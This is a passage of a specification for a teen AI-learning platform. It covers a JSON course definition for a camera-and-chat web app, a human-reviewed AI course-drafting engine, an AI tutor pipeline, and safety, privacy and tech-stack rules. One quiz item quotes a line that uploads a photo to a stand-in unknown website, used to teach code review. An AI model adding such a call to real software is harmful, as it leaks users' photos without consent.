  "skills": ["html-css", "javascript", "prompting-for-code", "reading-ai-code", "camera-apis"],
  "trailer": { "assetId": "vid-snaplab-trailer", "posterAssetId": "img-snaplab-trailer-poster", "captionsAssetId": "vtt-snaplab-trailer" },
  "whatYouMake": "A working web app, built in Replit (or Base44), that opens a camera, applies filters you designed, snaps photos, and sends disappearing messages to AI 'friends' in a pretend chat. You submit a private project link, plus screenshots of your filter applied to a provided sample image, cartoon avatar or object (not a photo of a real person), and of the disappearing chat.",
  "ethicsNote": "We talk about why disappearing messages aren't really gone, how filters affect body image, and why apps should ask before using a camera.",
  "safeguardingSensitive": false,
  "watchOut": { "type": "data", "note": "No real messaging between users. Follow the privacy settings in the setup guide. Do not paste API keys or personal information into the tool." },
  "toolRequirements": [
    { "toolSlug": "replit", "purpose": "Build, run and share the app", "required": true, "fallbackToolSlug": "base44" }
  ],
  "setupGuides": [
    {
      "id": "guide-replit",
      "toolSlug": "replit",
      "title": "Set up Replit",
      "lastVerifiedAt": "2026-11-01",
      "steps": [
        { "id": "g1", "title": "Create your account", "order": 1, "kind": "create_account", "body": "Open the Replit link from this course. Choose **Sign up**. Use an email you can access, or a sign-in option your parent has agreed to. Do not use your full real name as your public username — a nickname is enough. The guide screenshots show the current sign-up screen." },
        { "id": "g2", "title": "Verify your email", "order": 2, "kind": "verify_email", "body": "Open the email from Replit and click the verify link. If it does not arrive, check spam, wait a few minutes, then use **Resend**. You need a verified email before you can create a project." },
        { "id": "g3", "title": "Choose the free plan", "order": 3, "kind": "choose_free_plan", "body": "If you are offered a paid plan, choose **Skip** or **Start with free**. This course is written for the free plan. You do not need to enter a card. If a screen asks for payment, stop and ask a parent — you can complete the project on the free plan." },
        { "id": "g4", "title": "Turn on privacy settings", "order": 4, "kind": "privacy_settings", "body": "Open account **Settings**, then privacy. Set the project you create later to **Private** (not public). Turn off any optional marketing emails. Do not connect a social account you are not happy to be seen on. If you are under 18, a parent should look at this screen with you." }
      ]
    }
  ],
  "projectBrief": {
    "scenario": "A start-up called SnapLab wants a prototype camera app for their pitch day on Friday. You're the developer. Their brief: fun filters, a snap button, and a chat where snaps vanish after viewing.",
    "deliverables": ["Camera preview with at least 3 filters (1 designed by you)", "A 'Use sample image' button that loads the provided sample image so filters can be tested and screenshotted without a real person in shot", "Snap + save to gallery", "Chat screen with 2 AI friends", "Disappearing message timer", "A private Replit (or Base44) project link"],
    "constraints": ["Camera only starts after a clear permission prompt", "No real names or photos of real people in your demo or in what you submit as evidence — test filters on the provided sample image, a cartoon avatar, or an object", "No real messaging between real users", "Explain in your own words what each AI-written function does"],
    "stretchGoals": ["Face-tracking sticker on the provided sample image or cartoon avatar (do not submit a photo of a real person)", "Dark mode", "Accessibility: all buttons keyboard-reachable with labels"],
    "artefactTypes": ["web_app", "external_link"],
    "evidence": ["link", "screenshot"]
  },
  "modules": [
    {
      "id": "m1", "title": "Set up your tool and meet your AI helper", "summary": "Create a Replit account safely and learn to prompt for code you can understand.", "order": 1,
      "lessons": [
        { "id": "m1l1", "title": "What we're building", "order": 1, "estimatedMinutes": 15, "steps": [
          { "id": "s1", "type": "video", "title": "The finished app in 90 seconds", "order": 1, "estimatedMinutes": 3, "assetIds": ["vid-snaplab-trailer", "vtt-snaplab-trailer", "tx-snaplab-trailer"], "completion": { "rule": "view", "threshold": 0.8 }, "hints": [] },
          { "id": "s2", "type": "setup_guide", "title": "Create your Replit account", "order": 2, "estimatedMinutes": 11, "config": { "toolSlug": "replit", "guideId": "guide-replit", "throughStepIds": ["g1", "g2", "g3", "g4"] }, "completion": { "rule": "setup_acknowledged" }, "coachContext": "Talk them through the current setup step. Never ask for their password. If the screenshots look different, tell them a tool may have changed and to use Report so we can update the guide.", "hints": ["Have you verified your email yet?", "Skip any paid plan — the free plan is enough.", "Private project, nickname username, no card needed."] },
          { "id": "s13", "type": "checkpoint", "title": "You're set up", "order": 3, "estimatedMinutes": 1, "completion": { "rule": "view" }, "hints": [] }
        ]}
      ]
    },
    {
      "id": "m2", "title": "Camera and filters", "summary": "In Replit, get the camera working and design your own filter.", "order": 2,
      "lessons": [
        { "id": "m2l1", "title": "Open the camera (politely)", "order": 1, "estimatedMinutes": 20, "steps": [
          { "id": "s3", "type": "external_task", "title": "Create the project and ask for camera permission", "order": 1, "estimatedMinutes": 19, "config": { "toolSlug": "replit", "task": "Create a new HTML/JS Replit from the starter the guide names. In camera.js, request the camera only after the user taps a clearly labelled button. If they press Block, show a friendly message.", "clicks": ["Create Repl", "Choose HTML/CSS/JS", "Set the Repl to Private", "Open camera.js"] }, "completion": { "rule": "self_tick" }, "hints": ["Look up navigator.mediaDevices.getUserMedia.", "What should happen if someone presses Block?", "Wrap the call in try/catch and show a friendly message in the catch."] },
          { "id": "s4", "type": "checkpoint", "title": "Camera's live!", "order": 2, "estimatedMinutes": 1, "completion": { "rule": "view" }, "hints": [] }
        ]},
        { "id": "m2l2", "title": "Design a filter", "order": 2, "estimatedMinutes": 40, "steps": [
          { "id": "s5", "type": "external_task", "title": "Three built-in filters plus your signature filter", "order": 1, "estimatedMinutes": 40, "config": { "toolSlug": "replit", "task": "Add at least three filters, including one you designed. Add a 'Use sample image' button that loads the provided sample image (download it from this step) in place of the camera. Test your filters on the sample image, a cartoon avatar or an object — that is what you will screenshot later." }, "completion": { "rule": "self_tick" }, "hints": ["CSS filters like grayscale() are a quick start.", "Store filters in an array and loop through them.", "Canvas lets you change pixel colours directly."] }
        ]}
      ]
    },
    {
      "id": "m3", "title": "Chat that vanishes", "summary": "Build a pretend chat with AI friends and a disappearing timer, still in Replit.", "order": 3,
      "lessons": [
        { "id": "m3l1", "title": "AI friends", "order": 1, "estimatedMinutes": 40, "steps": [
          { "id": "s6", "type": "external_task", "title": "Create two AI friend characters and wire a pretend chat", "order": 1, "estimatedMinutes": 40, "config": { "toolSlug": "replit", "task": "Add two named characters with a short personality each. Use the tool's built-in AI helper, or a simple scripted reply list, so messages stay on this project only — no real users, no external webhooks to random sites. Read every line the AI writes." }, "completion": { "rule": "self_tick" }, "coachContext": "If they want to paste an API key, stop them. The course does not need one. Flag any instruction that would send photos off-device.", "hints": ["Do not paste API keys — you do not need any.", "If the helper suggests fetch() to an unknown URL, do not accept it.", "Keep the chat between you and the pretend characters only."] }
        ]},
        { "id": "m3l2", "title": "Disappearing messages and the ethics bit", "order": 2, "estimatedMinutes": 33, "steps": [
          { "id": "s7", "type": "external_task", "title": "10-second timer", "order": 1, "estimatedMinutes": 20, "config": { "toolSlug": "replit", "task": "After a message is viewed, remove it from the screen after 10 seconds." }, "completion": { "rule": "self_tick" }, "hints": ["setTimeout is your friend.", "Remove the element, not just hide it."] },
          { "id": "s8", "type": "ethics_checkpoint", "title": "Is it really gone?", "order": 2, "estimatedMinutes": 8, "body": "Screenshots, screen recordings, servers that keep copies… Decide what your app should promise users — honestly.", "config": { "prompt": "Write one honest sentence your app could show users about disappearing messages." }, "completion": { "rule": "self_tick" }, "hints": [] },
          { "id": "s9", "type": "quiz", "title": "Quick check", "order": 3, "estimatedMinutes": 4, "config": { "quizId": "q-snaplab-1" }, "completion": { "rule": "quiz_pass", "threshold": 0.66 }, "hints": [] },
          { "id": "s14", "type": "checkpoint", "title": "Chat and ethics done", "order": 4, "estimatedMinutes": 1, "completion": { "rule": "view" }, "hints": [] }
        ]}
      ]
    },
    {
      "id": "m4", "title": "Ship it", "summary": "Make sure it runs, then submit your link and screenshots.", "order": 4,
      "lessons": [
        { "id": "m4l1", "title": "Submit SnapLab", "order": 1, "estimatedMinutes": 27, "steps": [
          { "id": "s10", "type": "external_task", "title": "Check it runs and keep it private", "order": 1, "estimatedMinutes": 9, "config": { "toolSlug": "replit", "task": "Run the app once more. Confirm the project is Private. Copy the share link that a parent or teacher could open if you invited them — not a public listing." }, "completion": { "rule": "self_tick" }, "hints": ["A private share link is enough. Do not make the Repl public."] },
          { "id": "s11", "type": "reflection", "title": "What did the AI get wrong?", "order": 2, "estimatedMinutes": 5, "config": { "prompt": "Name one thing the AI wrote that you had to fix." }, "completion": { "rule": "self_tick" }, "hints": [] },
          { "id": "s15", "type": "checkpoint", "title": "Ready to submit", "order": 3, "estimatedMinutes": 1, "completion": { "rule": "view" }, "hints": [] },
          { "id": "s12", "type": "submit", "title": "Submit SnapLab", "order": 4, "estimatedMinutes": 12, "config": { "artefactTypes": ["web_app", "external_link"], "evidence": ["link", "screenshot"], "requireRubricSelfCheck": true, "evidenceHint": "Paste your private Replit (or Base44) link. For screenshots, show your filter applied to the provided sample image, a cartoon avatar or an object — not a photo of a real person — and the disappearing chat. Do not upload images or video of real people." }, "completion": { "rule": "submit" }, "hints": [] }
        ]}
      ]
    }
  ],
  "quizzes": [
    { "id": "q-snaplab-1", "title": "Disappearing messages", "passMark": 0.66, "questions": [
      { "id": "q1", "kind": "single", "prompt": "Your app deletes a message after 10 seconds. Which is true?", "options": [
        { "id": "a", "text": "Nobody can ever see it again", "correct": false, "feedback": "Screenshots and screen recordings still exist." },
        { "id": "b", "text": "It's gone from your app's screen, but copies may exist elsewhere", "correct": true, "feedback": "Exactly. Be honest with users about this." },
        { "id": "c", "text": "It's illegal to screenshot it", "correct": false, "feedback": "Not in general — which is why honesty matters." }
      ]},
      { "id": "q2", "kind": "single", "prompt": "When should your app ask for camera permission?", "options": [
        { "id": "a", "text": "As soon as the page loads", "correct": false, "feedback": "Asking before people know why feels creepy." },
        { "id": "b", "text": "When the user taps something that needs the camera", "correct": true, "feedback": "Ask in context." }
      ]},
      { "id": "q3", "kind": "spot_the_problem", "prompt": "The AI wrote: `fetch('https://random-site.com/upload', {body: photo})`. What's the problem?", "options": [
        { "id": "a", "text": "It sends the photo to an unknown website", "correct": true, "feedback": "Always read AI code for where data goes." },
        { "id": "b", "text": "Nothing, it's fine", "correct": false, "feedback": "Look at the URL again." }
      ]}
    ]}
  ],
  "rubric": { "criteria": [
    { "id": "r1", "name": "It works", "description": "Camera, filters, snap and chat all run", "levels": [
      { "label": "Not yet", "descriptor": "One or more core features don't run" },
      { "label": "Getting there", "descriptor": "Core features run with some bugs" },
      { "label": "Nailed it", "descriptor": "Everything runs smoothly" }]},
    { "id": "r2", "name": "Your own touch", "description": "Signature filter and design choices", "levels": [
      { "label": "Not yet", "descriptor": "Only template defaults" },
      { "label": "Getting there", "descriptor": "Some customisation" },
      { "label": "Nailed it", "descriptor": "Clearly your own style" }]},
    { "id": "r3", "name": "You understand the code", "description": "Can explain what AI-written functions do", "levels": [
      { "label": "Not yet", "descriptor": "Can't explain most functions" },
      { "label": "Getting there", "descriptor": "Can explain some" },
      { "label": "Nailed it", "descriptor": "Can explain all and fixed at least one AI mistake" }]},
    { "id": "r4", "name": "Respects users", "description": "Permissions, honesty, privacy", "levels": [
      { "label": "Not yet", "descriptor": "Camera starts without asking, or the project was made public" },
      { "label": "Getting there", "descriptor": "Asks permission" },
      { "label": "Nailed it", "descriptor": "Asks in context, honest message promise, project kept private" }]}
  ]},
  "version": "1.0.0",
  "guidesLastVerifiedAt": "2026-11-01"
}
```

### 6.2 Brief outlines for two further flagships

Author these as complete JSON to the same standard as Section 6.1, including Tools you'll need and a full setup guide for every required tool. Placeholder video assets (title screen + VTT + transcript) are acceptable until real videos are produced.

**Make Your Own AI Music Video** (video-film, Builder, min age 13, paid). Made in external image/video and editing tools (for example Canva plus CapCut). If a named tool is 18+, the Register policy is blocked or parent-operated, and the course will not start until any required parent approval is in place. Constraints: no real-person likeness; rights-cleared audio; a "Made with AI" end card. Learners submit an unlisted or view link to the exported video, or a video file that does not contain real people, plus an end-card screenshot that likewise does not show real people.

**Homework Helper Chatbot (The Honest Kind)** (chatbots-agents, Starter, min age 13, **free**). Built with a named 13+ text tool (for example ChatGPT, if the Register policy allows it, or the live equivalent), following the setup guide. The bot must refuse to write the student's assessed work and instead help them plan, explain and check. Parent approval is required if the tool's policy says so. Learners submit a bot link and/or screenshots plus a short honesty note. Watch-out: exam integrity.

### 6.3 AI course creation engine

The engine produces course drafts in the Section 6 schema. It is staff-only. It never publishes. Learners, parents and the public cannot see, search or open a draft until a human has approved it and it has been published (or reached a scheduled publish time).

All generation and discovery jobs are idempotent, retried with exponential backoff, observable (a job-runs table plus logs), cost-tracked, and safe to run concurrently. They use the job runner in Section 10. Model calls for drafting go through the same server-side AI gateway as Coach (no client code may call a provider). Drafting does **not** use learner Coach credits; it has its own per-draft and monthly cost caps, configurable in admin.

#### Automatic discovery (Tool Radar)

Scheduled jobs search the web and other sources for new AI tools and trends, then may auto-draft a course.

| Job | When | What it does |
|---|---|---|
| `radar.fetch.<source>` | Per source schedule | Pull new items via an official API or RSS. Store raw items (`url`, title, text, source, published time, raw JSON, content hash). Respect robots.txt, rate limits and terms of use. Identify the fetcher with a descriptive User-Agent. |
| `radar.normalise` | On new items | Canonicalise the URL, extract the tool name and vendor domain, and deduplicate against existing candidates and the Tool Register (vendor domain first; then name matching; embedding similarity if pgvector is available on the chosen Postgres). Duplicates attach as mentions, not new candidates. |
| `radar.enrich` | On a new candidate | Fetch the product homepage, pricing, terms/age and privacy pages (maximum 5 pages, text only). Extract structured facts **with quoted evidence and URLs**: category, what it does, free tier, stated minimum age, data/training policy, and how it is used. Unknowns stay empty — never guessed. Check the tool's stated age terms and propose an `under18Policy` for the editor to confirm. |
| `radar.score` | After enrich, and nightly | Score 0–100 with a stored breakdown and explanation (weights configurable). Factors: teen relevance, creative or job usefulness, momentum, whether a teen can reasonably use it (free or cheap tier, browser-based), safety and age fit, and longevity. A hard gate applies if there is no acceptable under-18 route: cap the score and flag "age-restricted — review before drafting". Penalise tools that duplicate an already-approved workflow unless they are clearly better. |
| `radar.draft_course` | When the score is at or above the admin-set threshold and the candidate has not been dismissed | Generate a **full** draft course in the Section 6 schema: title, tagline, what you'll make, project brief (including stretch goals), modules, lessons, steps (every launch step type as needed), setup guides (account creation, email verification, free plan, privacy settings, and how to do the project), quizzes with feedback, rubric, ethics checkpoint, and a draft Tool Register entry. Validate with the Zod schema; on failure, retry up to twice with the validation errors fed back. If it still fails, leave the draft flagged and in the review queue — **never publish**. Notify editors. |
| `radar.digest` | Weekly, Monday 08:00 Europe/London | Email and in-app digest to editors: top candidates, rising mentions, drafts waiting for review, and open tool-change alerts. |
| `tools.watch` | Weekly per registered tool; daily for approved tools used in live courses | Fetch terms, age, pricing, changelog, and (where practical) help or interface pages cited by our guides. Diff the content hash. On a change, summarise the difference and create a `tool_change_event` with an impact classification (`age_policy`, `pricing`, `interface`, `api_deprecation`, `feature_change`, `outage`, or `none`). |
| `tools.impact` | On a change event | Find courses and setup guides that use the tool. If impact is not `none`, mark guides stale and courses `needs_review`, and alert editors. For a tightening of age policy, block Start for affected learners until a human has triaged the event. Suggest substitutes from the Register where they exist. |

**Sources** are pluggable adapters with configuration stored in the database (not in code). The initial set, each enable/disable and schedule editable in admin:

- Hacker News (official Firebase API and Algolia HN Search) — AI-related terms and "Show HN"; default every 2 hours.
- Product Hunt official API — AI-topic launches; default daily. Requires a token; **check their API terms and ask Chris before enabling**.
- AI news RSS feeds (a configurable list); default every 4 hours.
- Vendor changelogs and blogs for major AI and creative-tool vendors (RSS where available, otherwise a page-hash watch); default daily.
- GitHub search for recently created repositories with AI topics and fast star growth; default daily. Read-only token only, no repository scopes; **ask Chris before enabling**.
- Hugging Face trending models and spaces; default daily.

Do not add further sources (for example YouTube or Reddit) without Chris's approval. Official free APIs and public RSS may be used where their terms allow, with the Radar User-Agent, rate limits and robots.txt respected.

Frequency, enabled sources, score threshold (default 70) and monthly draft and cost caps are admin-configurable and also have environment-variable defaults (Section 14). When a monthly cap is reached, auto-drafting pauses and admins are alerted; discovery and scoring may continue.

**Drafting guardrails.** The drafting prompt includes the course schema, the house style, at least three exemplar courses with setup guides, the enriched facts with evidence, Tool Register constraints, and safety rules (no real-person likeness, no data harvesting, ethics checkpoint required, completable on a free plan or cost clearly stated, and no evidence that requires images or video of real people until a CSAM screening provider is approved and enabled). Every tool-specific claim cites evidence URLs in an internal editor-notes field; any claim without evidence is marked `[VERIFY]` and shown as unverified in the review view. Drafts cannot require a tool that is not in the Register: the job creates a `candidate` Tool entry (with the extracted age terms) for the editor to complete and approve. Budget caps apply per draft and per month.

#### On-demand creation

From the admin dashboard, Chris (or an editor) can generate a draft without waiting for Radar:

- Type a **subject** (for example "AI football commentary generator").
- Type a **new platform or tool name** (for example "Base44" or a newly launched app). The engine looks up or creates a candidate Tool entry, enriches it if a public site can be found, checks stated age terms, and drafts the course around that tool.
- Enter a **course idea ID** from the ideas backlog.

The same draft pipeline, schema, validation, caps, evidence rules and review queue are used as for automatic drafts. On-demand jobs can run even if Radar auto-drafting is paused, but they still count towards the monthly cost cap unless the owner raises or overrides the cap (logged).

**Course ideas backlog.** A searchable, editable list of course ideas, each with a stable idea ID, title, one-line summary, category, difficulty, suggested min age, pathway(s), optional watch-out flags (18+ tools, extra safeguarding, exam integrity), and status (`idea`, `drafting`, `drafted`, `published`, `dismissed`). Seed it from the supplied file `content/course-ideas.json` (provided with this brief as `COURSE_IDEAS.json` — copy that file to `content/course-ideas.json` in the repo). The inventory has **175** ideas across 24 categories (52 Starter, 92 Builder, 31 Pro; 36 flagged for common 18+ tools and 20 with a safeguarding or data note). Chris can add, edit, dismiss or generate from an idea at any time. Do not invent extra ideas to fill gaps; use this file as the seed.

#### Review workflow

Automatic and on-demand drafts appear in the same review queue, clearly labelled "AI-drafted — must be reviewed", with origin (Radar or on-demand), the source candidate or idea, score (if any), evidence, unverified `[VERIFY]` flags, validation results, and the quality checklist from Section 7.

Chris or a reviewer can:

- **Approve** — publish now, or schedule a publish time. Approval records the reviewer, time, checklist answers, and a confirmation that tool-specific claims were checked against the live tool (required for AI drafts and for any course that uses an external tool). The publish service then runs the same rules as for a hand-made course.
- **Edit directly** — change any part of the draft in the structured course editor and/or in the front-end inline editor (below). Saving creates a new revision.
- **Request edits** — type instructions in plain English (for example "shorten module 2", "replace the 18+ tool with a 13+ alternative", "add a quiz to the ethics checkpoint"). The editor can apply the request to the whole course or to selected modules, lessons or steps. The AI regenerates only the requested scope, validates the result, and stores a new revision. Previous revisions stay in the version history and can be restored. A request can be repeated.
- **Decline** — with a reason. The draft is not published. The candidate or idea can be dismissed, watched, or left for a later attempt.

A draft that fails validation or the automated quality checks is flagged in the queue and **cannot be approved** until it passes (or a reviewer records an explicit, logged waiver for a specific check, where the validator allows one — for example a reviewed setup-guide waiver already defined in Section 6).

#### Front-end preview and inline editing

Drafts must be viewable and editable **exactly as they will look on the front end**. That means:

- The draft is rendered with the **real learner course page and course player**, not a separate schematic preview that can drift from production.
- It is hidden from the public and from learners: omitted from catalogues and search, `noindex`, and reachable only by staff (and the owner) who are signed in with 2FA, via a staff preview link. The link may carry a signed, time-limited, revocable token. Direct guesses of a draft slug must not work for signed-out users or learners.
- In that front-end view, staff can **edit inline**: text, step bodies and titles, quiz questions and feedback, setup-guide steps, and media (replace or upload). Saving goes through the same validators as the structured editor and writes a new revision.
- Staff can **test the full course end-to-end as a learner**, including each safety band (`teen_13_15`, `teen_16_17`, `adult_18`): start and continue, setup guides, external-task instructions, hints, quizzes, the ethics checkpoint, submission, and Coach (staff preview is already allowed by the Coach proxy). Preview runs must not issue certificates, appear in public or parent dashboards, or skew learning analytics.
- A "what a parent would see" view of Tools you'll need, age rules and approval requirements is also available before publish.

Nothing in a draft is visible to learners until it is approved and published.

#### Same content model, and configurable approval

Generated courses are ordinary `course` / `course_version` records with an origin of `ai_radar` or `ai_on_demand`. They must pass the same Zod validation, automated checks and quality checklist as hand-made courses (Section 6 and Section 7). Published versions stay immutable; further edits create a new version. Enrolments pin to the version a learner started.

**Approval rule (configurable).** A site setting, `require_second_reviewer_for_ai_drafts` (editable in admin, default **off**), controls whether AI drafts need two people:

- **Off (launch default):** Chris as sole owner — or any staff member whose role may publish — can approve and publish alone. There must still be at least one human approval record. The publish service refuses any version with none.
- **On:** two different people must approve. The last editor cannot be the only approver. The owner may be one of the two, never both. If the course is `safeguardingSensitive`, one of the two must have the `safety_reviewer` permission.

The same setting can later be extended to all courses, not only AI drafts; implement it so that is a configuration change, not a rewrite. Even when the setting is off, a clear warning is shown before a single person approves a `safeguardingSensitive` course, and they must confirm. This replaces any earlier rule that always required two people, or that forbade the owner from being the sole approver.


---

## 7. External tools, setup guides and submissions

Learners do their project work in **real external tools**. This platform teaches them how: it does not run, host or generate the build itself.

| In this platform | In the external tool |
|---|---|
| Course player, videos, reading, quizzes, ethics, Coach, notes | Account, project files, camera or preview, editors, that tool's AI features, export |
| Tools you'll need, setup guides, age rules, parent approvals | Following the guide |
| Submission of a link, screenshot, file or video; moderation; portfolio; certificates | The live project the link points at |

The Start path checks, for every required tool: the tool is approved and not blocked for this learner; if `parent_consent_required` or `parent_operated`, a valid parent approval exists; course `minAge` and the tool policy are compatible. Official tool links must use URLs stored on the Tool Register. Deep links may include a path and documented query params, never learner secrets.

QA checklist for reviewers (stored as versioned data): accuracy against the live tool; age suitability; safety (no real-person likeness generation; meaningful ethics checkpoint; evidence briefs do not require images or video of real people until a CSAM screening provider is approved and enabled — people-containing media is rejected); a first win within about 10 minutes; tiered hints that do not give away the solution; captions, transcripts and alt text; British English teen voice; completable on the free plan (or cost clearly stated); licensed assets; no step that encourages submitting AI work as the learner's own for school.

---

## 8. AI Coach

**Principle:** Coach is the only **learner-facing** in-platform model call at launch. It is an internal feature, not a Tool Register tool. The AI course creation engine also calls models, but only from staff jobs and the admin dashboard, never on behalf of a learner, and never using learner Coach credits. Both go through the server; no client code may call a model provider. Implement the Coach pipeline as a single composable server module `src/server/ai/proxy.ts`. Put drafting behind `src/server/ai/draft.ts` (or equivalent), sharing the gateway, logging, spend caps and provider enablement.

1. **AuthN/AuthZ:** valid session; role `learner` (or staff preview); account active and not paused; within the time cap and quiet hours; age-assurance satisfied; consent `ai_processing` granted.
2. **Capability check:** feature is only `tutor`; allowed for this step; kill switch off.
3. **Rate limits** (Postgres, or Redis only if you ask first): per user, family and IP, plus a global concurrency cap.
4. **Credit reservation:** estimate cost, reserve in `credit_ledger`, deny with a friendly message if insufficient.
5. **Input sanitisation:** strip detected personal data and refuse password, API key or one-time-code lookalikes.
6. **Input moderation:** provider moderation plus classifiers for self-harm, sexual content (any sexual content involving minors → hard block and DSL case), violence, hate, drugs, extremism, grooming, personal-data oversharing, academic dishonesty, and jailbreaks. Stricter for 13–15. Self-harm signals do **not** silently block: they route to the crisis pathway.
7. **Prompt assembly:** versioned system prompt (`coach.v1`), safety preamble, step `coachContext`, and age-band tone. Learner text is inserted as user content only, never concatenated into system instructions. Coach cannot log into external tools or complete the project.
8. **Model call via the AI gateway:** alias → provider mapping in `model_route`, with fallbacks; 30 s timeout; zero data retention / no-training settings where offered. No provider is enabled until Chris has approved it as a processor and a DPA is recorded in AI settings (model providers are not Tool Register tools).
9. **Output moderation:** same classifiers; block and regenerate once, else show a safe refusal.
10. **Commit credits** and write metadata. Persist message content only where consent and retention allow.
11. **Return** the output labelled as AI-generated. Stream text via Server-Sent Events, with a final moderation check before persisting.

Credits are internal "AI energy" for Coach only (configurable `CREDIT_VALUE_PENCE`, default 0.1 pence, with a 1.3× margin). The ledger is append-only; balance updates use a row lock. Concurrency tests must show that parallel requests never overspend. Periods are monthly from the subscription anniversary (or calendar month on Free). At 80% of the daily spend cap, alert admins; at 100% the kill switch trips ("AI break — back soon").

**Behaviour (system prompt contract):** hint ladder (what have you tried → nudge → clue → similar worked example → concept — never the full solution); for code, at most a short illustrative snippet; for writing, questions and structures, never the learner's final text; refuse homework and exam answers; stay on topic; no romantic role-play; no medical, legal or financial advice beyond signposting; short replies, British English, reading level appropriate to band; never ask for personal information; admit uncertainty; never claim to be human; never discourage talking to trusted adults. Context available to Coach is the current course step, guide instructions, hints, rubric, safety band and accessibility preferences — not other learners' data, real names, passwords, or any external-tool session.

**Retention:** default for 13–15 is the active session plus 30 days, then delete content and keep counts and topics; with "resume chat" consent, 90 days; flagged conversations follow the safeguarding schedule, DSL access only.

**Evaluation:** maintain `evals/coach/*.yaml` covering the hint ladder, solution and homework refusal, jailbreaks, PII, and crisis disclosures (the fixed script must trigger 100%). Pass thresholds: crisis 100%, solution leakage ≤ 2%, homework-writing ≤ 1%, overall ≥ 95%. CI uses fixtures; do not call live providers in CI.

---

## 9. Safety, privacy and accessibility

This section is **not legal advice**. Items marked ⚖️ need confirmation from a UK data-protection or online-safety lawyer, and a trained DSL, before launch.

**Legal framework to respect:** UK GDPR and the Data Protection Act 2018 (lawful basis, minimisation, purpose and storage limitation, security, rights, DPIA ⚖️, records of processing, processor DPAs, transfer safeguards). Meet the 15 ICO Children's code standards in product defaults and document the mapping in `docs/compliance/CHILDRENS_CODE_MAPPING.md`. Online Safety Act 2023: assess scope ⚖️ and keep the required risk assessments in `docs/compliance/`. Consumer law: 14-day cancellation for digital content ⚖️, easy cancellation and renewal reminders ⚖️. Copyright: licensed asset library; no copyrighted music ingestion.

**Private by default.** No public profiles. Display name is a username or nickname. Avatars are generated, not photographs. No learner-to-learner visibility, comments or friends at launch. Learner areas and certificate verify pages are `noindex`. Learners cannot message each other. Staff interact with learner records only through logged support, moderation and safeguarding surfaces.

**Moderation states:** `pending` → `approved` | `blocked` | `escalated`. Automated checks run first. Clean submissions may be auto-accepted when `auto_accept_clean_submissions` is on (launch default). Flagged items, reports and the configured sample go to the human queue. SLA targets are admin-configurable. Sole-operator defaults (UK daytime 08:00–22:00): critical — immediate alert to the owner, acknowledgement target 4 hours; high — 8 hours; normal — 48 hours. Tighter targets (for example 1 hour for critical) can be set once a DSL, deputy or outsourced cover is in place.

**DSL workflow.** Triggers include the crisis classifier, exploitation or abuse disclosures, "Someone is in danger" reports, and moderator escalation. Cases have severity (`critical`, `high`, `medium`, `low`). The crisis script itself is automatic and does not wait for a human: it is shown immediately, a safeguarding case is created, and the owner/DSL is alerted at once by email, and by SMS if an approved SMS provider is configured. Critical and high cases also use that immediate alert. Deputy escalation is admin-configurable and defaults to **off** until a deputy is named; when on, the default is 60 minutes unacknowledged (configurable). Case notes are encrypted (`SAFEGUARDING_ENCRYPTION_KEY`); viewing them is break-glass. The DSL records a decision, may contact a parent from a template or make an external referral, and can restrict or close the account. Provide a weekly counts-and-themes report and a policy template at `docs/compliance/SAFEGUARDING_POLICY.md` ⚖️.

**Retention defaults** (configurable in `retention_policy`, enforced nightly): account and progress for the life of the account, then 14 days after a deletion request or 24 months after last activity (with a 30-day warning to the parent); tutor conversations 30 or 90 days as above; AI metadata 13 months then aggregated; flagged content 12 months after resolution; safeguarding cases per DSL policy ⚖️; artefacts for the life of the account; billing 6 years (parent data only); audit logs 2 years; pending teen accounts 7 days.

**Analytics and cookies.** Strictly necessary cookies only for learners. No advertising pixels in learner areas. Learner events, if any analytics are approved, are pseudonymised, with no session replay. Parent and marketing pages may use analytics with a cookie banner and opt-in. Ask before adding any analytics vendor.

**Security baseline.** Target OWASP ASVS L2. Authorisation lives in a single `authz` module and is tested so learner A cannot read learner B's anything. Encryption at rest, plus app-level encryption for safeguarding notes. Secrets only in environment variables. Dependency, secret and SAST scanning in CI. Rate limiting on auth and AI routes; bot protection on sign-up if approved. Daily backups with at least 7 days of point-in-time recovery. Incident runbook including ICO breach notification within 72 hours ⚖️.

**Transparent AI labelling.** Every Coach output is labelled as AI. Published course pages show that content was **Reviewed and signed off by the team** and the last-checked date (a human has signed it off, whether the course was AI-drafted or hand-made). In admin, AI-drafted courses are clearly labelled "AI-drafted — must be reviewed" until they are approved. Guides tell learners to include a "Made with AI" end card or note where generative media is used.

**Accessibility.** WCAG 2.2 AA on every surface: keyboard-operable interactions, visible focus, skip links, logical headings, target size at least 24×24 px, no drag-only interactions (the course editor needs a button alternative for reordering), captions and transcripts on every video, a genuine dyslexia-friendly reading mode (not merely a colour invert), persistent text size, high contrast and reduced motion (honour `prefers-reduced-motion`), colour never the sole cue, and contrast of 4.5:1 for text and 3:1 for components. Authentication must allow password managers and paste. Test with axe-core on every route (zero serious or critical violations) and with keyboard-only scripts for the player, Coach, setup guides and submission.

---

## 10. Recommended tech stack

| Layer | Choice |
|---|---|
| Framework | Next.js (App Router, latest stable) + TypeScript (strict) |
| UI | **Your choice** — accessible, well-supported components or primitives. Visual design, layout and UI are entirely your call. Must meet WCAG 2.2 AA and work on 4 GB Chromebooks. |
| Forms/validation | React Hook Form + Zod (shared client/server) |
| Database | Postgres in London: **Neon** (default if Chris prefers one bill via the Vercel Marketplace) or **Supabase**. Implement with Drizzle so either works; ask Chris to choose before binding the project to a provider. |
| ORM | Drizzle ORM + drizzle-kit migrations |
| Auth | Better Auth (self-hosted in our DB): username plugin, email/password, magic links, TOTP 2FA for staff, family model. Child accounts do not need email. |
| Payments | Stripe (Billing, Checkout, Customer Portal, SetupIntents), GBP, UK VAT via Stripe Tax ⚖️ |
| Hosting | Vercel, functions pinned to London (`lhr1`) |
| Background jobs | Inngest (default) for retention, exports, publishing, notifications, the freshness sweep, Tool Radar, tool-change watching and course-draft generation; ask before enabling a paid tier |
| AI (Coach and course drafting) | Vercel AI SDK + Vercel AI Gateway. Coach is learner-facing; drafting is staff-only. Neither is used to build learner projects. Dedupe Radar candidates by vendor domain and name; use pgvector similarity only if it is available on the chosen Postgres — do not add a separate vector database. |
| Object storage | Supabase Storage (London) or AWS S3 eu-west-2 / Cloudflare R2 with EU jurisdiction ⚖️ |
| Video | Mux or Cloudflare Stream if approved; MP4 + VTT from storage is an acceptable starting point |
| Email | Resend or Postmark (UK/EU sending) with React Email. Transactional only; never marketing to under-18s. |
| Search | Postgres full-text |
| PDF certificates | `@react-pdf/renderer` |
| Testing | Vitest, Testing Library, Playwright, axe-core, MSW |
